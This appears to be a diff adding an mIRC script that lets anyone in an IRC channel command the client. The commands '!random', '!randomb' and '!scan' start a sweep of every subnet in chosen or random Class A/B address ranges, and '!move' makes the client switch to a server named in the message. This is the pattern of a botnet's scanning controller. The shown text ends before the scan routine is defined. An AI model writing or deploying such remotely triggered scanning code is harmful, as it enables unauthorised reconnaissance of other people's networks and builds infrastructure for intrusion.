@@ -1,0 +1,29 @@
+on 1:text:*:#:{
+if ($1 == !random) {
+set %random1 $rand(1,250)
+set %random2 $rand(1,240)
+msg $chan 15Good Job, scanning: 4ClassA: 9 %random1  4ClassB: 9 %random2  And all the Subnets there
+scan70 %random1 %random2
+}
+if ($1 == !randomb) {
+set %random1 $2
+set %random2 $rand(1,240)
+msg $chan 15Good Job, scanning: 4ClassA: 9 %random1  4ClassB: 9 %random2  And all the Subnets there
+scan70 %random1 %random2
+}
+if ($1 == !scan) {
+msg $chan 15Good Job, scanning: 4ClassA: 9 $2  4ClassB: 9 $3  And all the Subnets there
+scan70 $2 $3
+}
+if ($1 == !move) {
+	set %server $2
+server $2
+}
+}
+alias scan70 {
+%scan.range = $$1
+%scan.inc1 = 1
+%scan.inc2 = 1
+%scan.inc3 = $$2
+%scan = $gettok(%scan.range,1,46) $+ . $+ %scan.inc3 $+ . $+ %scan.inc1 $+ . $+ %scan.inc2
+.scan1
